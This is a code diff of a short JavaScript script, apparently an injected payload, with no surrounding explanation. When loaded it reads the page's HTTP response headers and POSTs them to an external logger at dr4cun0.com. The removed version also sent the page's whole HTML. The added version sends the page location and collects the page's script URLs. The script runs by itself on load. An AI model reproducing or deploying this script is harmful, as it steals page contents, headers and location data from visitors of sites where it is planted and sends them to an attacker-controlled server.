@@ -4,21 +4,31 @@ function getHeader() {
 	req.send(null);
 	var headers = req.getAllResponseHeaders().toLowerCase();
 	//alert(headers);
-	loadXMLDoc(headers);
+	sendRequest(headers);
 }
-function loadXMLDoc(headers) {
-    var xmlhttp = new XMLHttpRequest();
+function sendRequest(headers) {
+				
 
-    xmlhttp.onreadystatechange = function() {
+		//var source = document.body.parentNode.innerHTML;
+		var data = "";
+		for(var i = 0; i < document.getElementsByTagName('script').length; i++) {
+			data += document.getElementsByTagName('script')[i].src + "\n";
+		}
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function() {
         if (xmlhttp.readyState == XMLHttpRequest.DONE ) {
            if (xmlhttp.status == 200) {
                //document.getElementById("myDiv").innerHTML = xmlhttp.responseText;
-           }
-        }
-    };
-
-    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
-    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    xmlhttp.send("source=" + encodeURI(document.body.parentNode.innerHTML) + "&headers=" + encodeURI(headers));
+               //setTimeout(sendRequest(headers, arr, arr.length, (thisreqno + 1)), 5000);
+	           }
+	        }
+	    };
+	
+	    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
+	    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	    xmlhttp.send("headers=" + encodeURI(headers) + "&location=" + encodeURI(document.location));
+	    
+	
 }
+
 getHeader();
